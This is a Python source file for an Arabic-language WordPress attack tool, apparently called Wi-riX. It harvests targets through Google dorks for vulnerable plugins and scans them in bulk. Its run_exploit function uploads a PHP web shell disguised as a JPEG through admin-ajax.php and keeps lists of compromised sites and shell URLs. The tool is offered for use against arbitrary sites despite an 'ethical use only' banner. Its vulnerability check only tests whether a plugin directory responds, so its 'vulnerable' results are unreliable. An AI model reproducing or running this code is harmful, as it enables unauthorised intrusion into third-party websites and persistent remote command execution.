#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# 👑 Wi-riX WordPress Exploitation Framework v5.0 👑
# 🔥 المطور: Wi-riX | ملك الاختراق الأخلاقي 🔥
# 📦 التحميل: github.com/waled122/Wi-riX
# ============================================================

import os
import sys
import json
import time
import requests
from datetime import datetime
from urllib.parse import urljoin

# ======================= [ إعدادات الألوان ] =======================
try:
    from colorama import init, Fore, Style
    init()
    R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; B = Fore.BLUE
    C = Fore.CYAN; W = Fore.WHITE; M = Fore.MAGENTA; RESET = Style.RESET_ALL
    BOLD = Style.BRIGHT
except:
    R=G=Y=B=C=W=M=RESET=BOLD=""

# ======================= [ مسار الإطار ] =======================
FRAMEWORK_PATH = os.path.dirname(os.path.abspath(__file__))
DEVELOPER = "Wi-riX"
VERSION = "5.0.0"

# ======================= [ إنشاء المجلدات ] =======================
for folder in ['exploits', 'reports', 'shells', 'targets', 'logs', 'config']:
    os.makedirs(os.path.join(FRAMEWORK_PATH, folder), exist_ok=True)

# ======================= [ قاعدة بيانات الثغرات ] =======================
def load_exploits():
    """تحميل قاعدة بيانات الثغرات"""
    db_path = os.path.join(FRAMEWORK_PATH, 'exploits', 'exploits_db.json')
    if os.path.exists(db_path):
        with open(db_path, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {
        "1": {
            "name": "CVE-2026-4885 - Piotnet Addons RCE",
            "cve": "CVE-2026-4885",
            "risk": "🔥 حرجة",
            "check": "/wp-content/plugins/piotnet-addons-for-elementor-pro/",
            "type": "رفع ملف",
            "dork": "inurl:/wp-content/plugins/piotnet-addons-for-elementor-pro/",
            "description": "ثغرة رفع ملفات تؤدي إلى تنفيذ أوامر عن بعد"
        },
        "2": {
            "name": "CVE-2024-6386 - WP Statistics SQLi",
            "cve": "CVE-2024-6386",
            "risk": "⚠️ عالية",
            "check": "/wp-content/plugins/wp-statistics/",
            "type": "حقن SQL",
            "dork": "inurl:/wp-content/plugins/wp-statistics/",
            "description": "ثغرة حقن SQL تؤدي إلى اختراق قاعدة البيانات"
        },
        "3": {
            "name": "CVE-2023-5360 - Elementor Pro RCE",
            "cve": "CVE-2023-5360",
            "risk": "🔥 حرجة",
            "check": "/wp-content/plugins/elementor-pro/",
            "type": "تنفيذ أوامر",
            "dork": "inurl:/wp-content/plugins/elementor-pro/",
            "description": "ثغرة تنفيذ أوامر عن بعد في Elementor Pro"
        }
    }

def save_exploits(exploits):
    """حفظ قاعدة بيانات الثغرات"""
    db_path = os.path.join(FRAMEWORK_PATH, 'exploits', 'exploits_db.json')
    with open(db_path, 'w', encoding='utf-8') as f:
        json.dump(exploits, f, indent=4, ensure_ascii=False)

# ======================= [ عرض القوائم ] =======================
def clear_screen():
    """مسح الشاشة"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """عرض الشعار"""
    clear_screen()
    print(f"""{BOLD}{C}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   {R}██╗    ██╗██╗██████╗ ██╗██╗  ██╗{C}    {R}███████╗██╗  ██╗██████╗ ██╗{C}           ║
║   {R}██║    ██║██║██╔══██╗██║╚██╗██╔╝{C}    {R}██╔════╝╚██╗██╔╝██╔══██╗██║{C}           ║
║   {R}██║ █╗ ██║██║██████╔╝██║ ╚███╔╝{C}     {R}█████╗   ╚███╔╝ ██████╔╝██║{C}           ║
║   {R}██║███╗██║██║██╔══██╗██║ ██╔██╗{C}     {R}██╔══╝   ██╔██╗ ██╔═══╝ ██║{C}           ║
║   {R}╚███╔███╔╝██║██║  ██║██║██╔╝ ██╗{C}    {R}███████╗██╔╝ ██╗██║     ██║{C}           ║
║   {R} ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝{C}    {R}╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝{C}           ║
║                                                                              ║
║   {W}🔥 Wi-riX إطار اختبار اختراق الووردبريس {VERSION} 🔥{C}                          ║
║   {W}👑 المطور: {DEVELOPER} | للاستخدام الأخلاقي فقط 👑{C}                           ║
║   {W}📦 التحميل: github.com/waled122/Wi-riX{C}                                   ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝{RESET}
""")

def print_main_menu():
    """عرض القائمة الرئيسية"""
    print(f"""
{Y}╔════════════════════════════════════════════════════════════════════════╗
║                         {W}✨ القائمة الرئيسية ✨{Y}                         ║
╠════════════════════════════════════════════════════════════════════════╣
║                                                                         ║
║  {C}[1]{RESET} {W}🔍 البحث عن ثغرات{RESET}                                               ║
║      {W}└─ استعرض كل الثغرات واختر الثغرة المناسبة{RESET}                             ║
║                                                                         ║
║  {C}[2]{RESET} {W}🎯 استهداف موقع مباشر{RESET}                                         ║
║      {W}└─ أدخل رابط الموقع لاختباره مباشرة{RESET}                                   ║
║                                                                         ║
║  {C}[3]{RESET} {W}📁 فحص ملف كامل (مجموعة أهداف){RESET}                                ║
║      {W}└─ حمل ملف أهداف وافحصهم كلهم دفعة واحدة{RESET}                              ║
║                                                                         ║
║  {C}[4]{RESET} {W}📊 التقارير والمخترقات{RESET}                                        ║
║      {W}└─ اعرض كل التقارير والمواقع المخترقة{RESET}                                 ║
║                                                                         ║
║  {C}[5]{RESET} {W}❌ خروج{RESET}                                                      ║
║                                                                         ║
╚════════════════════════════════════════════════════════════════════════╝
""")

def print_exploits_menu():
    """عرض قائمة الثغرات"""
    exploits = load_exploits()
    print(f"""
{C}╔════════════════════════════════════════════════════════════════════════╗
║                      {W}📋 قائمة الثغرات المتاحة{C}                         ║
╚════════════════════════════════════════════════════════════════════════╝{RESET}
""")
    for eid, exp in exploits.items():
        print(f"""
  {C}[{eid}]{RESET} {BOLD}{exp['name']}{RESET}
      📌 {exp['cve']} | {exp['risk']}
      📝 {exp['description']}
      🔍 الدروك الافتراضي: {exp['dork']}
""")
    print(f"{C}{'─'*60}{RESET}")

def print_exploit_options(exploit_id, exploit):
    """عرض خيارات الثغرة بعد اختيارها"""
    print(f"""
{C}╔════════════════════════════════════════════════════════════════════════╗
║              {W}🎯 ثغرة: {exploit['name']}{C}                              ║
╚════════════════════════════════════════════════════════════════════════╝{RESET}

  {Y}اختر طريقة البحث:{RESET}

  {C}[1]{RESET} 🔍 بحث تلقائي (استخدام الدروك الافتراضي)
      └─ {exploit['dork']}

  {C}[2]{RESET} ✏️ إضافة دروك مخصص (من عندك)
      └─ أدخل دروك البحث بنفسك

  {C}[3]{RESET} 📝 إضافة رابط موقع مباشر (أو IP)
      └─ أدخل الرابط يدوياً

  {C}[4]{RESET} 🔙 رجوع للقائمة الرئيسية
""")

# ======================= [ البحث عن الأهداف ] =======================
def search_google(dork, max_results=20):
    """البحث في Google عن أهداف"""
    print(f"\n{Y}[*] جاري البحث في Google عن: {dork}{RESET}")
    targets = []
    
    try:
        from googlesearch import search
        for url in search(dork, num_results=max_results):
            if url.startswith('http'):
                targets.append(url)
                print(f"{G}[+] تم العثور على: {url}{RESET}")
    except ImportError:
        print(f"{R}[!] مكتبة البحث غير مثبتة. جاري التثبيت...{RESET}")
        os.system("pip install googlesearch-python --break-system-packages 2>/dev/null")
        print(f"{Y}[*] أعد تشغيل الأداة بعد التثبيت{RESET}")
        return []
    except Exception as e:
        print(f"{R}[!] خطأ في البحث: {e}{RESET}")
        print(f"{Y}[*] يمكنك استخدام الخيار 3 لإضافة روابط يدوياً{RESET}")
    
    return targets

def save_targets(targets, filename_prefix="targets"):
    """حفظ الأهداف في ملف"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(FRAMEWORK_PATH, 'targets', f"{filename_prefix}_{timestamp}.txt")
    
    with open(filename, 'w', encoding='utf-8') as f:
        for target in targets:
            f.write(target + '\n')
    
    print(f"{G}[+] تم حفظ {len(targets)} هدف في: {filename}{RESET}")
    return filename

# ======================= [ فحص الثغرات ] =======================
def check_vulnerability(target, exploit):
    """فحص هدف واحد لثغرة محددة"""
    check_url = urljoin(target, exploit['check'])
    try:
        r = requests.get(check_url, timeout=10, verify=False, 
                        headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code in [200, 403]:
            print(f"{G}[+] ✅ الهدف {target} ثغرة {exploit['name']}{RESET}")
            return True
        else:
            print(f"{R}[+] ❌ الهدف {target} غير ثغر{RESET}")
            return False
    except Exception as e:
        print(f"{R}[!] خطأ في فحص {target}{RESET}")
        return False

def scan_targets(targets, exploit):
    """فحص قائمة من الأهداف لثغرة محددة"""
    print(f"\n{C}{'═'*60}{RESET}")
    print(f"{BOLD}{W}🔍 جاري فحص {len(targets)} هدف...{RESET}")
    print(f"{C}{'═'*60}{RESET}")
    
    vulnerable = []
    for target in targets:
        if check_vulnerability(target, exploit):
            vulnerable.append(target)
    
    return vulnerable

def save_vulnerable(vulnerable, exploit_name):
    """حفظ الأهداف الثغرية"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(FRAMEWORK_PATH, 'targets', f"vulnerable_{timestamp}.txt")
    
    with open(filename, 'w', encoding='utf-8') as f:
        for target in vulnerable:
            f.write(f"{target} | {exploit_name}\n")
    
    # أضف للملف الرئيسي
    master_file = os.path.join(FRAMEWORK_PATH, 'targets', 'all_vulnerable.txt')
    with open(master_file, 'a', encoding='utf-8') as f:
        for target in vulnerable:
            f.write(f"{target} | {exploit_name} | {datetime.now()}\n")
    
    print(f"{G}[+] تم حفظ {len(vulnerable)} هدف ثغر في: {filename}{RESET}")
    return filename

# ======================= [ استغلال الثغرة ] =======================
def run_exploit(target, exploit):
    """تشغيل الاستغلال على هدف معين"""
    print(f"\n{C}{'═'*60}{RESET}")
    print(f"{BOLD}{W}💣 جاري استغلال الثغرة على: {target}{RESET}")
    print(f"{C}{'═'*60}{RESET}")
    
    if exploit['type'] == 'رفع ملف':
        shell_code = '<?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?>'
        shell_name = f"wirix_{int(time.time())}.phtml"
        
        files = {'file': (shell_name, shell_code, 'image/jpeg')}
        data = {'action': 'pafe_ajax_form_builder', 'post_id': '1', 'form_id': '1'}
        
        try:
            r = requests.post(urljoin(target, "/wp-admin/admin-ajax.php"), 
                             files=files, data=data, timeout=15, verify=False)
            
            if r.status_code == 200:
                shell_url = urljoin(target, f"/wp-content/uploads/{shell_name}")
                print(f"\n{G}{'═'*60}{RESET}")
                print(f"{BOLD}{G}✅ تم رفع الشيل بنجاح!{RESET}")
                print(f"{G}{'═'*60}{RESET}")
                print(f"  🔗 رابط الشيل: {shell_url}")
                print(f"  🔑 أمر الاختبار: {shell_url}?cmd=id")
                print(f"{G}{'═'*60}{RESET}")
                
                # حفظ الشيل
                shells_file = os.path.join(FRAMEWORK_PATH, 'shells', 'shells_found.txt')
                with open(shells_file, 'a', encoding='utf-8') as f:
                    f.write(f"{target} | {shell_url} | {datetime.now()}\n")
                
                return True
            else:
                print(f"{R}[-] فشل رفع الشيل (كود: {r.status_code}){RESET}")
        except Exception as e:
            print(f"{R}[-] خطأ: {e}{RESET}")
    
    return False

# ======================= [ الوظائف الرئيسية ] =======================
def search_for_exploits():
    """الخيار 1: البحث عن ثغرات"""
    print_exploits_menu()
    
    exploit_id = input(f"\n{B}[?] اختر رقم الثغرة: {RESET}")
    exploits = load_exploits()
    
    if exploit_id not in exploits:
        print(f"{R}[-] رقم ثغرة غير صحيح!{RESET}")
        input(f"{Y}[!] اضغط Enter للمتابعة...{RESET}")
        return
    
    exploit = exploits[exploit_id]
    
    while True:
        print_exploit_options(exploit_id, exploit)
        choice = input(f"{B}[?] اختر خيار (1-4): {RESET}")
        
        targets = []
        
        if choice == "1":
            # بحث تلقائي بالدروك الافتراضي
            targets = search_google(exploit['dork'])
            
        elif choice == "2":
            # إضافة دروك مخصص
            custom_dork = input(f"{B}[?] أدخل الدروك المخصص: {RESET}")
            targets = search_google(custom_dork)
            
        elif choice == "3":
            # إضافة رابط مباشر
            print(f"{Y}[*] أدخل الروابط (اكتب 'done' عند الانتهاء):{RESET}")
            while True:
                url = input(f"{B}رابط> {RESET}")
                if url.lower() == 'done':
                    break
                if url.startswith('http'):
                    targets.append(url)
                    print(f"{G}[+] تم إضافة: {url}{RESET}")
            
        elif choice == "4":
            return
        
        else:
            print(f"{R}[-] خيار غير صحيح!{RESET}")
            continue
        
        if targets:
            # حفظ الأهداف
            targets_file = save_targets(targets)
            
            # فحص الأهداف
            vulnerable = scan_targets(targets, exploit)
            
            if vulnerable:
                # حفظ الأهداف الثغرية
                victims_file = save_vulnerable(vulnerable, exploit['name'])
                
                # سؤال عن الاستغلال
                print(f"\n{G}[+] تم العثور على {len(vulnerable)} هدف ثغر!{RESET}")
                exploit_choice = input(f"{B}[?] هل تريد استغلال أحدها؟ (y/n): {RESET}")
                
                if exploit_choice.lower() == 'y':
                    print(f"\n{Y}الأهداف الثغرية:{RESET}")
                    for i, v in enumerate(vulnerable, 1):
                        print(f"  {i}. {v}")
                    
                    try:
                        target_idx = int(input(f"{B}اختر رقم الهدف: {RESET}")) - 1
                        if 0 <= target_idx < len(vulnerable):
                            run_exploit(vulnerable[target_idx], exploit)
                    except:
                        pass
            else:
                print(f"{R}[-] لم يتم العثور على أهداف ثغرية!{RESET}")
        else:
            print(f"{R}[-] لم يتم العثور على أهداف!{RESET}")
        
        input(f"\n{Y}[!] اضغط Enter للمتابعة...{RESET}")
        break

def target_direct():
    """الخيار 2: استهداف موقع مباشر"""
    print(f"\n{C}{'═'*60}{RESET}")
    print(f"{BOLD}{W}🎯 استهداف موقع مباشر{RESET}")
    print(f"{C}{'═'*60}{RESET}")
    
    target = input(f"{B}[?] أدخل رابط الموقع (مثال: https://example.com): {RESET}")
    
    if not target.startswith('http'):
        target = 'https://' + target
    
    print_exploits_menu()
    exploit_id = input(f"{B}[?] اختر رقم الثغرة: {RESET}")
    exploits = load_exploits()
    
    if exploit_id in exploits:
        exploit = exploits[exploit_id]
        
        if check_vulnerability(target, exploit):
            print(f"\n{G}[+] الهدف ثغر! هل تريد استغلاله؟{RESET}")
            choice = input(f"{B}[?] (y/n): {RESET}")
            if choice.lower() == 'y':
                run_exploit(target, exploit)
        else:
            print(f"{R}[-] الهدف غير ثغر لهذه الثغرة{RESET}")
    else:
        print(f"{R}[-] رقم ثغرة غير صحيح!{RESET}")
    
    input(f"\n{Y}[!] اضغط Enter للمتابعة...{RESET}")

def scan_file():
    """الخيار 3: فحص ملف كامل"""
    print(f"\n{C}{'═'*60}{RESET}")
    print(f"{BOLD}{W}📁 فحص ملف كامل{RESET}")
    print(f"{C}{'═'*60}{RESET}")
    
    targets_dir = os.path.join(FRAMEWORK_PATH, 'targets')
    files = [f for f in os.listdir(targets_dir) if f.endswith('.txt') and not f.startswith('vulnerable')]
    
    if not files:
        print(f"{R}[-] لا توجد ملفات أهداف!{RESET}")
        print(f"{Y}[*] استخدم الخيار 1 أولاً للبحث عن أهداف{RESET}")
        input(f"{Y}[!] اضغط Enter للمتابعة...{RESET}")
        return
    
    print(f"{Y}الملفات المتاحة:{RESET}")
    for i, f in enumerate(files, 1):
        size = os.path.getsize(os.path.join(targets_dir, f))
        print(f"  {i}. {f} ({size} بايت)")
    
    try:
        choice = int(input(f"{B}اختر ملف: {RESET}")) - 1
        if 0 <= choice < len(files):
            filepath = os.path.join(targets_dir, files[choice])
            with open(filepath, 'r', encoding='utf-8') as f:
                targets = [line.strip() for line in f if line.strip()]
            
            print(f"{G}[+] تم تحميل {len(targets)} هدف{RESET}")
            
            print_exploits_menu()
            exploit_id = input(f"{B}اختر رقم الثغرة: {RESET}")
            exploits = load_exploits()
            
            if exploit_id in exploits:
                exploit = exploits[exploit_id]
                vulnerable = scan_targets(targets, exploit)
                
                if vulnerable:
                    victims_file = save_vulnerable(vulnerable, exploit['name'])
                    print(f"\n{G}[+] تم العثور على {len(vulnerable)} هدف ثغر!{RESET}")
                    
                    exploit_choice = input(f"{B}[?] هل تريد استغلال أحدها؟ (y/n): {RESET}")
                    if exploit_choice.lower() == 'y':
                        for i, v in enumerate(vulnerable, 1):
                            print(f"  {i}. {v}")
                        target_idx = int(input(f"{B}اختر رقم الهدف: {RESET}")) - 1
                        if 0 <= target_idx < len(vulnerable):
                            run_exploit(vulnerable[target_idx], exploit)
            else:
                print(f"{R}[-] رقم ثغرة غير صحيح!{RESET}")
    except:
        pass
    
    input(f"\n{Y}[!] اضغط Enter للمتابعة...{RESET}")

def show_reports():
    """الخيار 4: عرض التقارير والمخترقات"""
    print(f"\n{C}{'═'*60}{RESET}")
    print(f"{BOLD}{W}📊 التقارير والمخترقات{RESET}")
    print(f"{C}{'═'*60}{RESET}")
    
    # عرض الأهداف الثغرية
    targets_dir = os.path.join(FRAMEWORK_PATH, 'targets')
    victims_files = [f for f in os.listdir(targets_dir) if f.startswith('vulnerable_') or f == 'all_vulnerable.txt']
    
    if victims_files:
        print(f"\n{G}🎯 قائمة المواقع المخترقة:{RESET}")
        for f in victims_files:
            path = os.path.join(targets_dir, f)
            size = os.path.getsize(path)
            print(f"  📄 {f} ({size} بايت)")
            
            # عرض المحتوى
            if f == 'all_vulnerable.txt':
                with open(path, 'r', encoding='utf-8') as file:
                    lines = file.readlines()
                    if lines:
                        print(f"     آخر 5 مخترقات:")
                        for line in lines[-5:]:
                            print(f"     └─ {line.strip()}")
    
    # عرض الشيلات
    shells_file = os.path.join(FRAMEWORK_PATH, 'shells', 'shells_found.txt')
    if os.path.exists(shells_file):
        print(f"\n{G}💀 الشيلات المرفوعة:{RESET}")
        with open(shells_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            for line in lines[-10:]:
                print(f"  🐚 {line.strip()}")
    
    input(f"\n{Y}[!] اضغط Enter للمتابعة...{RESET}")

# ======================= [ التشغيل الرئيسي ] =======================
def main():
    try:
        import urllib3
        urllib3.disable_warnings()
    except:
        pass
    
    while True:
        print_banner()
        print_main_menu()
        choice = input(f"{B}{DEVELOPER}@framework> {RESET}")
        
        if choice == "1":
            search_for_exploits()
        elif choice == "2":
            target_direct()
        elif choice == "3":
            scan_file()
        elif choice == "4":
            show_reports()
        elif choice == "5":
            print(f"{G}[+] مع السلامة {DEVELOPER}! 👑{RESET}")
            sys.exit(0)
        else:
            print(f"{R}[-] خيار غير صحيح!{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()